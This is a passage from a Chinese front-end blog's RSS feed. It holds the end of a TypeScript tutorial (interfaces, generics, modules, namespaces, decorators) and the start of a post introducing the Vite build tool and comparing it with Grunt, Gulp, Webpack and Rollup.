  second<span>?</span><span>:</span> <span>string</span><span>;</span> <span>//加个问号, 接口属性就可以变成可传可不传了, 不传默认是undefined。</span>
<span>}</span>
<span>//打印变量</span>
<span>function</span> <span>logParam</span><span>(</span>name<span>:</span> InterfaceName<span>)</span><span>:</span> <span>void</span> <span>{</span>
  <span>console</span><span>.</span><span>log</span><span>(</span>name<span>.</span>first<span>,</span> name<span>.</span>second<span>,</span> <span>11</span><span>)</span><span>;</span>
<span>}</span>
<span>//定义参数</span>
<span>const</span> obj <span>=</span> <span>{</span> first<span>:</span> <span>"1"</span><span>,</span> second<span>:</span> <span>"fff"</span><span>,</span> three<span>:</span> <span>1</span> <span>}</span><span>;</span>
<span>//logParam({ first: "1", second: "1", three: 1 }); //报错,只能传接口定义的值</span>
<span>logParam</span><span>(</span>obj<span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>
<p>用个变量来存储传入的变量,这样可以传入定义的接口以外的值, 否则如果直接传入对象中无接口定义的值会报错, 所以建议接口定义了哪些值就传哪些值。</p>
</div>
<h3 id="函数类型接口" tabindex="-1"> 函数类型接口</h3>
<p>对方法传入的参数类型,以及返回值类型进行约束,可批量进行约束。</p>
<div><pre><code><span>interface</span> <span>keyMap</span> <span>{</span>
  <span>(</span>key<span>:</span> <span>string</span><span>,</span> value<span>:</span> <span>string</span><span>)</span><span>:</span> <span>string</span><span>;</span>
<span>}</span>
<span>let</span> logKeyMap<span>:</span> <span>keyMap</span> <span>=</span> <span>function</span> <span>(</span>key1<span>:</span> <span>string</span><span>,</span> value<span>:</span> <span>string</span><span>)</span><span>:</span> <span>string</span> <span>{</span>
  <span>return</span> key1 <span>+</span> value<span>;</span>
<span>}</span><span>;</span>
<span>console</span><span>.</span><span>log</span><span>(</span><span>logKeyMap</span><span>(</span><span>"key1"</span><span>,</span> <span>"value"</span><span>)</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>
<p>接口只对传入的参数的类型和参数的个数进行约束, 不对参数名称进行约束。</p>
</div>
<h3 id="可索引接口" tabindex="-1"> 可索引接口</h3>
<h4 id="约束数组" tabindex="-1"> 约束数组</h4>
<div><pre><code><span>interface</span> <span>Arr</span> <span>{</span>
  <span>[</span>index<span>:</span> <span>number</span><span>]</span><span>:</span> <span>string</span><span>;</span>
<span>}</span>
<span>let</span> ss<span>:</span> Arr <span>=</span> <span>[</span><span>"2121"</span><span>]</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><h3 id="约束对象" tabindex="-1"> 约束对象</h3>
<div><pre><code><span>interface</span> <span>Obj</span> <span>{</span>
  <span>[</span>index<span>:</span> <span>string</span><span>]</span><span>:</span> <span>string</span><span>;</span>
<span>}</span>

<span>let</span> interfaceArr<span>:</span> Obj <span>=</span> <span>{</span> aa<span>:</span> <span>"1"</span> <span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>
<p>对数组进行约束,index 后必须跟着 number 类型。对对象进行约束,index 后必须跟着 string 类型索引签名参数类型必须为 &quot;string&quot; 或 &quot;number&quot;</p>
</div>
<h3 id="类类型接口" tabindex="-1"> 类类型接口</h3>
<h4 id="对类进行约束-类似抽象类的实现" tabindex="-1"> 对类进行约束,类似抽象类的实现</h4>
<div><pre><code><span>interface</span> <span>Animals</span> <span>{</span>
  name<span>:</span> <span>string</span><span>;</span>
  <span>eat</span><span>(</span><span>)</span><span>:</span> <span>void</span><span>;</span>
<span>}</span>

<span>class</span> <span>Dogs</span> <span>implements</span> <span>Animals</span> <span>{</span>
  name<span>:</span> <span>string</span><span>;</span>
  <span>constructor</span><span>(</span>name<span>:</span> <span>string</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
  <span>}</span>
  <span>eat</span><span>(</span><span>)</span> <span>{</span><span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id="接口继承-接口可以继承接口" tabindex="-1"> 接口继承--接口可以继承接口</h4>
<div><pre><code><span>interface</span> <span>Dog</span> <span>{</span>
  <span>eat</span><span>(</span><span>)</span><span>:</span> <span>void</span><span>;</span>
<span>}</span>

<span>interface</span> <span>Persons</span> <span>extends</span> <span>Dog</span> <span>{</span>
  <span>work</span><span>(</span><span>)</span><span>:</span> <span>void</span><span>;</span>
<span>}</span>

<span>class</span> <span>Cat</span> <span>{</span>
  <span>code</span><span>(</span><span>)</span> <span>{</span>
    <span>console</span><span>.</span><span>log</span><span>(</span><span>"猫在敲代码"</span><span>)</span><span>;</span>
  <span>}</span>
<span>}</span>

<span>//可继承类后再实现接口</span>
<span>class</span> <span>SuperMan</span> <span>extends</span> <span>Cat</span> <span>implements</span> <span>Persons</span> <span>{</span>
  <span>eat</span><span>(</span><span>)</span><span>:</span> <span>void</span> <span>{</span>
    <span>console</span><span>.</span><span>log</span><span>(</span><span>1</span><span>)</span><span>;</span>
  <span>}</span>
  <span>work</span><span>(</span><span>)</span><span>:</span> <span>void</span> <span>{</span>
    <span>console</span><span>.</span><span>log</span><span>(</span><span>2</span><span>)</span><span>;</span>
  <span>}</span>
<span>}</span>
<span>let</span> superMan <span>=</span> <span>new</span> <span>SuperMan</span><span>(</span><span>)</span><span>;</span>
superMan<span>.</span><span>code</span><span>(</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>
<p>类接口会对类的属性和方法进行约束, 类似非抽象类继承抽象类时必须实现某些方法和属性, 但对属性和方法的类型的约束更加严格, 除了方法 void 类型可被重新定义外, 其他属性或方法的类型定义需要和接口保持一致</p>
</div>
<h2 id="泛型" tabindex="-1"> 泛型</h2>
<p>软件工程中, 我们不仅要创建一致的定义良好的 api, 同时也要考虑可重用性。组件不仅能够支持当前的数据类型, 同时也能支持未来的数据类型, 这在创建大型系统时为你提供了十分灵活的功能</p>
<p>泛型就是解决类、接口、方法的复用性, 以及对不特定数据类型的支持。</p>
<p>要求:传入的参数和返回的参数一致</p>
<h3 id="函数的泛型" tabindex="-1"> 函数的泛型</h3>
<div><pre><code><span>function</span> <span><span>getDate</span><span><span>&lt;</span><span>T</span><span>></span></span></span><span>(</span>value<span>:</span> <span>T</span><span>)</span><span>:</span> <span>T</span> <span>{</span>
  <span>return</span> value<span>;</span>
<span>}</span>
<span>console</span><span>.</span><span>log</span><span>(</span><span><span>getDate</span><span><span>&lt;</span><span>number</span><span>></span></span></span><span>(</span><span>123</span><span>)</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>
<p>这里的 T 可改成其他任意值但定义的值, 和传入的参数以及返回的参数是一样的,一般默认写法是 T, 也是业内规范的选择。</p>
</div>
<h3 id="类的泛型" tabindex="-1"> 类的泛型</h3>
<div><pre><code><span>class</span> <span>MinClass<span>&lt;</span><span>T</span><span>></span></span> <span>{</span>
  <span>public</span> list<span>:</span> <span>T</span><span>[</span><span>]</span> <span>=</span> <span>[</span><span>]</span><span>;</span>
  <span>//添加</span>
  <span>add</span><span>(</span>value<span>:</span> <span>T</span><span>)</span><span>:</span> <span>void</span> <span>{</span>
    <span>this</span><span>.</span>list<span>.</span><span>push</span><span>(</span>value<span>)</span><span>;</span>
  <span>}</span>

  <span>//求最小值</span>
  <span>min</span><span>(</span><span>)</span><span>:</span> <span>T</span> <span>{</span>
    <span>//假设这个值最小</span>
    <span>let</span> minNum <span>=</span> <span>this</span><span>.</span>list<span>[</span><span>0</span><span>]</span><span>;</span>
    <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> <span>this</span><span>.</span>list<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
      <span>//比较并获取最小值</span>
      minNum <span>=</span> minNum <span>&lt;</span> <span>this</span><span>.</span>list<span>[</span>i<span>]</span> <span>?</span> minNum <span>:</span> <span>this</span><span>.</span>list<span>[</span>i<span>]</span><span>;</span>
    <span>}</span>
    <span>return</span> minNum<span>;</span>
  <span>}</span>
<span>}</span>
<span>//实例化类 并且指定了类的T的类型是number</span>
<span>let</span> minClass <span>=</span> <span>new</span> <span>MinClass<span>&lt;</span><span>number</span><span>></span></span><span>(</span><span>)</span><span>;</span>
minClass<span>.</span><span>add</span><span>(</span><span>23</span><span>)</span><span>;</span>
minClass<span>.</span><span>add</span><span>(</span><span>5</span><span>)</span><span>;</span>
minClass<span>.</span><span>add</span><span>(</span><span>2</span><span>)</span><span>;</span>
<span>console</span><span>.</span><span>log</span><span>(</span>minClass<span>.</span><span>min</span><span>(</span><span>)</span><span>)</span><span>;</span>
<span>//实例化类 并且指定了类的T的类型是string, 则其方法的传参和返回都是string类型</span>
<span>let</span> minClass2 <span>=</span> <span>new</span> <span>MinClass<span>&lt;</span><span>string</span><span>></span></span><span>(</span><span>)</span><span>;</span>
minClass2<span>.</span><span>add</span><span>(</span><span>"23"</span><span>)</span><span>;</span>
minClass2<span>.</span><span>add</span><span>(</span><span>"5"</span><span>)</span><span>;</span>
minClass2<span>.</span><span>add</span><span>(</span><span>"2"</span><span>)</span><span>;</span>
<span>console</span><span>.</span><span>log</span><span>(</span>minClass2<span>.</span><span>min</span><span>(</span><span>)</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="接口的泛型" tabindex="-1"> 接口的泛型</h3>
<h4 id="第一种写法" tabindex="-1"> 第一种写法</h4>
<div><pre><code><span>interface</span> <span>ConfigFn</span> <span>{</span>
  <span>//规范参数类型,返回值类型</span>
  <span>&lt;</span><span>T</span><span>></span><span>(</span>value<span>:</span> <span>T</span><span>)</span><span>:</span> <span>T</span><span>;</span>
<span>}</span>

<span>let</span> getData<span>:</span> <span>ConfigFn</span> <span>=</span> <span>function</span> <span>&lt;</span><span>T</span><span>></span><span>(</span>value<span>:</span> <span>T</span><span>)</span><span>:</span> <span>T</span> <span>{</span>
  <span>return</span> value<span>;</span>
<span>}</span><span>;</span>

<span>console</span><span>.</span><span>log</span><span>(</span><span><span>getData</span><span><span>&lt;</span><span>string</span><span>></span></span></span><span>(</span><span>"z11"</span><span>)</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id="第二种写法" tabindex="-1"> 第二种写法</h4>
<div><pre><code><span>interface</span> <span>ConfigFn<span>&lt;</span><span>T</span><span>></span></span> <span>{</span>
  <span>//参数类型 , 返回值类型</span>
  <span>(</span>value<span>:</span> <span>T</span><span>)</span><span>:</span> <span>T</span><span>;</span>
<span>}</span>

<span>//接口方法</span>
<span>function</span> <span><span>getData</span><span><span>&lt;</span><span>T</span><span>></span></span></span><span>(</span>value<span>:</span> <span>T</span><span>)</span><span>:</span> <span>T</span> <span>{</span>
  <span>return</span> value<span>;</span>
<span>}</span>

<span>//使用接口</span>
<span>let</span> myGetDate<span>:</span> ConfigFn<span>&lt;</span><span>string</span><span>></span> <span>=</span> getData<span>;</span>
<span>console</span><span>.</span><span>log</span><span>(</span><span>myGetDate</span><span>(</span><span>"3"</span><span>)</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>
<p>接口的泛型只针对函数类型的接口</p>
</div>
<h3 id="类当做参数传入泛型类" tabindex="-1"> 类当做参数传入泛型类</h3>
<div><pre><code><span>//用户类--和数据库表字段进行映射</span>
<span>class</span> <span>User</span> <span>{</span>
  username<span>:</span> <span>string</span> <span>|</span> <span>undefined</span><span>;</span>
  password<span>:</span> <span>string</span> <span>|</span> <span>undefined</span><span>;</span>
  <span>//构造函数-初始化参数</span>
  <span>constructor</span><span>(</span>param<span>:</span> <span>{</span>
    username<span>:</span> <span>string</span> <span>|</span> <span>undefined</span><span>;</span>
    password<span>?</span><span>:</span> <span>string</span> <span>|</span> <span>undefined</span><span>;</span>
  <span>}</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>username <span>=</span> param<span>.</span>username<span>;</span>
    <span>this</span><span>.</span>password <span>=</span> param<span>.</span>password<span>;</span>
  <span>}</span>
<span>}</span>

<span>//数据库类</span>
<span>class</span> <span>Db<span>&lt;</span><span>T</span><span>></span></span> <span>{</span>
  <span>add</span><span>(</span>user<span>:</span> <span>T</span><span>)</span><span>:</span> <span>boolean</span> <span>{</span>
    <span>console</span><span>.</span><span>log</span><span>(</span>user<span>)</span><span>;</span>
    <span>return</span> <span>true</span><span>;</span>
  <span>}</span>
  <span>updated</span><span>(</span>user<span>:</span> <span>T</span><span>,</span> id<span>:</span> <span>number</span><span>)</span><span>:</span> <span>boolean</span> <span>{</span>
    <span>console</span><span>.</span><span>log</span><span>(</span>user<span>,</span> id<span>)</span><span>;</span>
    <span>return</span> <span>true</span><span>;</span>
  <span>}</span>
<span>}</span>

<span>let</span> u <span>=</span> <span>new</span> <span>User</span><span>(</span><span>{</span>
  username<span>:</span> <span>"张三"</span><span>,</span>
<span>}</span><span>)</span><span>;</span>

<span>//u.username = "李四";</span>
u<span>.</span>password <span>=</span> <span>"111111"</span><span>;</span>
<span>let</span> db <span>=</span> <span>new</span> <span>Db<span>&lt;</span>User<span>></span></span><span>(</span><span>)</span><span>;</span>
db<span>.</span><span>add</span><span>(</span>u<span>)</span><span>;</span>
db<span>.</span><span>updated</span><span>(</span>u<span>,</span> <span>1</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>
<p>类的参数名和类型都做了约束。</p>
</div>
<h2 id="模块" tabindex="-1"> 模块</h2>
<p>内部模块称为命名空间, 外部模块简称为模块, 模块在其自身的作用域里执行, 而不是在全局作用域里;</p>
<p>这意味着定义在一个模块里的变量、函数、类等等在模块外部是不可见的, 除非你明确的使用<code>export</code>形式之一导出它们。</p>
<p>相反, 如果想使用其它模块导出的变量, 函数, 类, 接口等的时候, 你必须要导人它们, 可以使用<code>import</code>形式之一。</p>
<p>我们可以一些公共的功能单独抽离成一个文件作为一个模块。模块里面的变量、函数、类等默认是私有的, 如果我们要在外部访问模块里面的数据(变量、函数、类) 我们需要通过<code>export</code>暴露模块里面的数据(变量、函数、类...)。暴露后我们通过<code>import</code>引入模块就可以使用模块里面暴露的数据(变量、函数、类...)</p>
<div><pre><code><span>//modules/db.ts</span>
<span>function</span> <span>getDate</span><span>(</span><span>)</span><span>:</span> <span>any</span><span>[</span><span>]</span> <span>{</span>
  <span>console</span><span>.</span><span>log</span><span>(</span><span>"获取数据"</span><span>)</span><span>;</span>
  <span>return</span> <span>[</span>
    <span>{</span>
      userName<span>:</span> <span>"张三"</span><span>,</span>
    <span>}</span><span>,</span>
    <span>{</span>
      userName<span>:</span> <span>"李四"</span><span>,</span>
    <span>}</span><span>,</span>
  <span>]</span><span>;</span>
<span>}</span>

<span>//一个模块里面可以用多次</span>
<span>// export { getDate };</span>
<span>//一个模块里面只能用一次</span>
<span>export</span> <span>default</span> getDate<span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><pre><code><span>import</span> <span>{</span> getDate <span>as</span> getDbDate <span>}</span> <span>from</span> <span>"./modules/db"</span><span>;</span>
<span>import</span> getDbDate <span>from</span> <span>"./modules/db"</span><span>;</span>
<span>getDbDate</span><span>(</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><div><p>提示</p>
<p>这个调试时浏览器中不能直接使用,可在<code>node</code>和<code>weakpack</code>的环境中调试。</p>
</div>
<h2 id="命名空间" tabindex="-1"> 命名空间</h2>
<p>在代码量较大的情况下, 为了避免各种变量命名相冲突, 可将相似功能的函数、类、接口等放置到命名空间内 TypeScript 的命名空间可以将代码包裹起来, 只对外暴露需要在外部访问的对象。</p>
<p>命名空间和模块的区别</p>
<ul>
<li>命名空间：内部模块, 主要用于组织代码, 避免命名冲突。</li>
<li>模块：ts 外部模块的简称, 侧重代码的复用, 一个模块里可能会有多个命名空间。</li>
</ul>
<div><pre><code><span>// modules/Animal.ts</span>
<span>export</span> <span>namespace</span> <span>A</span> <span>{</span>
  <span>interface</span> <span>Animal</span> <span>{</span>
    name<span>:</span> String<span>;</span>
    <span>eat</span><span>(</span><span>)</span><span>:</span> <span>void</span><span>;</span>
  <span>}</span>

  <span>export</span> <span>class</span> <span>Dog</span> <span>implements</span> <span>Animal</span> <span>{</span>
    name<span>:</span> String<span>;</span>
    <span>constructor</span><span>(</span>theName<span>:</span> <span>string</span><span>)</span> <span>{</span>
      <span>this</span><span>.</span>name <span>=</span> theName<span>;</span>
    <span>}</span>
    <span>eat</span><span>(</span><span>)</span> <span>{</span>
      <span>console</span><span>.</span><span>log</span><span>(</span><span>"我是"</span> <span>+</span> <span>this</span><span>.</span>name<span>)</span><span>;</span>
    <span>}</span>
  <span>}</span>
<span>}</span>

<span>export</span> <span>namespace</span> <span>B</span> <span>{</span>
  <span>interface</span> <span>Animal</span> <span>{</span>
    name<span>:</span> String<span>;</span>
    <span>eat</span><span>(</span><span>)</span><span>:</span> <span>void</span><span>;</span>
  <span>}</span>

  <span>export</span> <span>class</span> <span>Dog</span> <span>implements</span> <span>Animal</span> <span>{</span>
    name<span>:</span> String<span>;</span>
    <span>constructor</span><span>(</span>theName<span>:</span> <span>string</span><span>)</span> <span>{</span>
      <span>this</span><span>.</span>name <span>=</span> theName<span>;</span>
    <span>}</span>
    <span>eat</span><span>(</span><span>)</span> <span>{</span><span>}</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><pre><code><span>import</span> <span>{</span> <span>A</span><span>,</span> <span>B</span> <span>}</span> <span>from</span> <span>"./modules/Animal"</span><span>;</span>
<span>let</span> ee <span>=</span> <span>new</span> <span><span>A</span></span><span>.</span><span>Dog</span><span>(</span><span>"小贝"</span><span>)</span><span>;</span>
ee<span>.</span><span>eat</span><span>(</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h2 id="装饰器" tabindex="-1"> 装饰器</h2>
<h3 id="类装饰器" tabindex="-1"> 类装饰器</h3>
<p>类装饰器在类申明之前被申明(紧靠着类申明), 类装饰器应用于类构造函数, 可以用于监视, 修改或者替换类定义。</p>
<div><pre><code><span>function</span> <span>logClass</span><span>(</span>params<span>:</span> <span>any</span><span>)</span> <span>{</span>
  <span>console</span><span>.</span><span>log</span><span>(</span>params<span>)</span><span>;</span>
  <span>//params 就是指代当前类--HttpClient</span>
  params<span>.</span>prototype<span>.</span>apiUrl <span>=</span> <span>"动态扩展属性"</span><span>;</span>
  params<span>.</span>prototype<span>.</span><span>run</span> <span>=</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
    <span>console</span><span>.</span><span>log</span><span>(</span><span>"动态扩展方法"</span><span>)</span><span>;</span>
  <span>}</span><span>;</span>
  params<span>.</span>prototype<span>.</span><span>getDate</span> <span>=</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
    <span>console</span><span>.</span><span>log</span><span>(</span><span>"动态扩展方法2"</span><span>)</span><span>;</span>
  <span>}</span><span>;</span>
<span>}</span>

<span><span>@</span><span>logClass</span></span>
<span>class</span> <span>HttpClient</span> <span>{</span>
  <span>constructor</span><span>(</span><span>)</span> <span>{</span><span>}</span>
  <span>getDate</span><span>(</span><span>)</span> <span>{</span>
    <span>console</span><span>.</span><span>log</span><span>(</span><span>1</span><span>)</span><span>;</span>
  <span>}</span>
<span>}</span>

<span>let</span> http<span>:</span> <span>any</span> <span>=</span> <span>new</span> <span>HttpClient</span><span>(</span><span>)</span><span>;</span>
<span>console</span><span>.</span><span>log</span><span>(</span>http<span>.</span>apiUrl<span>)</span><span>;</span>
http<span>.</span><span>run</span><span>(</span><span>)</span><span>;</span>
http<span>.</span><span>getDate</span><span>(</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>
<p>装饰器会覆盖被装饰的类中的方法</p>
</div>
<h3 id="装饰器工厂" tabindex="-1"> 装饰器工厂</h3>
<p>可传参的装饰器</p>
<div><pre><code><span>function</span> <span>logClassB</span><span>(</span>param<span>:</span> <span>string</span><span>)</span> <span>{</span>
  <span>return</span> <span>function</span> <span>(</span>target<span>:</span> <span>any</span><span>)</span> <span>{</span>
    <span>console</span><span>.</span><span>log</span><span>(</span>target<span>,</span> <span>"装饰器以下的类"</span><span>)</span><span>;</span>
    <span>console</span><span>.</span><span>log</span><span>(</span>param<span>,</span> <span>"装饰器传进来的属性"</span><span>)</span><span>;</span>
  <span>}</span><span>;</span>
<span>}</span>

<span><span>@</span><span>logClassB</span></span><span>(</span><span>"小慧"</span><span>)</span>
<span>class</span> <span>HttpClients</span> <span>{</span>
  <span>constructor</span><span>(</span><span>)</span> <span>{</span><span>}</span>
  <span>getDate</span><span>(</span><span>)</span> <span>{</span><span>}</span>
<span>}</span>

<span>let</span> https<span>:</span> <span>any</span> <span>=</span> <span>new</span> <span>HttpClients</span><span>(</span><span>)</span><span>;</span>
<span>console</span><span>.</span><span>log</span><span>(</span>https<span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="构造函数装饰器" tabindex="-1"> 构造函数装饰器</h3>
<div><pre><code><span>function</span> <span>logClassC</span><span>(</span>target<span>:</span> <span>any</span><span>)</span> <span>{</span>
  <span>console</span><span>.</span><span>log</span><span>(</span>target<span>,</span> <span>1111</span><span>)</span><span>;</span>
  <span>//用在这里继承目标类并重载方法和属性</span>
  <span>return</span> <span>class</span> <span><span>extends</span></span> target <span>{</span>
    a<span>:</span> <span>any</span> <span>=</span> <span>"我是修改后的属性"</span><span>;</span>
    <span>getDate</span><span>(</span><span>)</span> <span>{</span>
      <span>console</span><span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>a <span>+</span> <span>"--装饰器中的方法输出的"</span><span>)</span><span>;</span>
    <span>}</span>
  <span>}</span><span>;</span>
<span>}</span>

<span><span>@</span><span>logClassC</span></span>
<span>class</span> <span>HttpClient2</span> <span>{</span>
  <span>public</span> a<span>:</span> <span>string</span> <span>|</span> <span>undefined</span><span>;</span>
  <span>constructor</span><span>(</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>a <span>=</span> <span>"我是构造函数里面的a"</span><span>;</span>
  <span>}</span>
  <span>getDate</span><span>(</span><span>)</span> <span>{</span>
    <span>console</span><span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>a<span>)</span><span>;</span>
  <span>}</span>
<span>}</span>
<span>const</span> https2 <span>=</span> <span>new</span> <span>HttpClient2</span><span>(</span><span>)</span><span>;</span>
https2<span>.</span><span>getDate</span><span>(</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Vite 下一代前端开发与构建工具</title>
      <link>https://vxhly.github.io/views/vite/study-vite.html</link>
      <guid>https://vxhly.github.io/views/vite/study-vite.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Vite 下一代前端开发与构建工具</source>
      <description>前言
Vite2.x 也推出了有一段时间了, 作为一名合格的前端开发人员, 没错我入坑了, 以下本篇文章记录的是 Vite 的一些知识点。

</description>
      <category>vite</category>
      <pubDate>Wed, 25 Aug 2021 20:03:58 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>Vite2.x 也推出了有一段时间了, 作为一名合格的前端开发人员, 没错我入坑了, 以下本篇文章记录的是 Vite 的一些知识点。</p>
</div>

<h2 id="回顾以往的前端自动化构建工具" tabindex="-1"> 回顾以往的前端自动化构建工具</h2>
<h3 id="grunt-基于任务的构建工具" tabindex="-1"> Grunt - 基于任务的构建工具</h3>
<ul>
<li>Grunt - 基于任务的构建工具
<ul>
<li><strong>优点：</strong>
<ul>
<li>灵活, 它只负责执行我们定义好的任务</li>
<li>大量可复用插件封装好了常见的构建任务</li>
</ul>
</li>
<li><strong>缺点：</strong>
<ul>
<li>是集成度不高, 要写很多配置后才可以用, 无法做到开箱即用</li>
</ul>
</li>
</ul>
</li>
<li>Gulp - 基于任务的构建工具
<ul>
<li><strong>优点：</strong>
<ul>
<li>好用又不失灵活, 既可以单独完成构建, 也可以和其他工具搭配使用</li>
</ul>
</li>
<li><strong>缺点：</strong>
<ul>
<li>是集成度不高, 要写很多配置后才可以用, 无法做到开箱即用</li>
</ul>
</li>
</ul>
</li>
<li>Webpack - 基于模块化的构建工具</li>
</ul>
<p><img src="/assets/study-vite-1.png" alt="Vite"></p>
<ul>
<li><strong>优点：</strong>
<ul>
<li>专注于处理模块化的项目, 能做到开箱即用、一步到位</li>
<li>可通过 Plugin 扩展, 完整好用又不失灵活性</li>
<li>使用场景不局限于 Web 开发</li>
<li>社区庞大活跃, 经常引入紧跟时代发展的新特性, 能为大多数场景找到已有的开源扩展</li>
<li>良好的开发体验</li>
</ul>
</li>
<li><strong>缺点：</strong>
<ul>
<li>只能用于采用模块化开发的项目</li>
<li>打包时间与应用大小成正比, 应用越大打包时间越久</li>
</ul>
</li>
<li>Rollup - 基于模块化的构建工具
<ul>
<li><strong>优点：</strong>
<ul>
<li>配置简单, 打包速度快</li>
<li>自动移除未引用的代码（内置 <code>tree shaking</code>）</li>
</ul>
</li>
<li><strong>缺点：</strong>
<ul>
<li>开发服务器不能实现模块热更新, 调试繁琐</li>
<li>浏览器环境的代码分割依赖 <code>amd</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="为什么会有构建工具的出现" tabindex="-1"> 为什么会有构建工具的出现</h3>
<ul>
<li>解决前端模块化问题</li>
<li>使繁琐的任务变得更加简单</li>
<li>使 less/scss 预处理变得更加方便</li>
<li>资源压缩与混淆, 只有更小的和更安全的构建包才能传输的更快且不容易被拦截
<blockquote>
<p>扩展：js 混淆与加密在线工具（<a href="https://www.sojson.com/jsjiemi.html" target="_blank" rel="noopener noreferrer">https://www.sojson.com/jsjiemi.html</a>）</p>
</blockquote>
</li>
</ul>
<h2 id="vite-由来" tabindex="-1"> Vite 由来</h2>
<blockquote>
<p>作者在微博在发言：</p>
<p>Vite, 一个基于浏览器原生 ES imports 的开发服务器。利用浏览器去解析 imports, 在服务器端按需编译返回, 完全跳过了打包这个概念, 服务器随起随用。同时不仅有 Vue 文件支持, 还搞定了热更新, 而且热更新的速度不会随着模块增多而变慢。针对生产环境则可以把同一份代码用 rollup 打。虽然现在还比较粗糙, 但这个方向我觉得是有潜力的, 做得好可以彻底解决改一行代码等半天热更新的问题</p>
</blockquote>
<p>它主要具有以下特点：</p>
<ul>
<li>快速的冷启动, 不需要等待打包操作</li>
<li>即时的模块热更新, 替换性能和模块数量的解耦让更新飞起</li>
<li>真正的按需编译, 不再等待整个应用编译完成</li>
<li>基于 ESM 的 Dev Server + HMR（模块热更新）</li>
<li>基于 esbuild 的依赖预优化</li>
<li>基于 Rollup 的 Plugins + Bundle</li>
<li>更好的 SSR 支持</li>
</ul>
<p>产生 Vite 的历程</p>
<ul>
<li>传统的 Webpack Dev Server 冷启动时间是比较长的</li>
<li>Webpack 模块热更新的反应速度比较慢</li>
</ul>
<h3 id="vite-的日活量" tabindex="-1"> Vite 的日活量</h3>
<p><img src="/assets/study-vite-2.png" alt="Vite"></p>
<h3 id="esm-在浏览器的支持度" tabindex="-1"> ESM 在浏览器的支持度</h3>
<p>默认的构建目标浏览器是能 在 script 标签上支持原生 ESM 和 原生 ESM 动态导入。传统浏览器可以通过官方插件 @vitejs/plugin-legacy 支持     Vite 需要 Node.js 版本 &gt;= 12.0.0；Vite 的 2.4.x 版本不兼容 npm@7  ESM 最大的特点是在浏览器端使用 <code>export import</code> 的方式导入和导出模块, 在 script 标签里设置 <code>type=&quot;module&quot;</code> , 然后使用 <strong>ES module</strong>。正因如此, vite 高度依赖<code>module script</code>特性, 也就意味着从这里开始抛弃了 IE 市场</p>
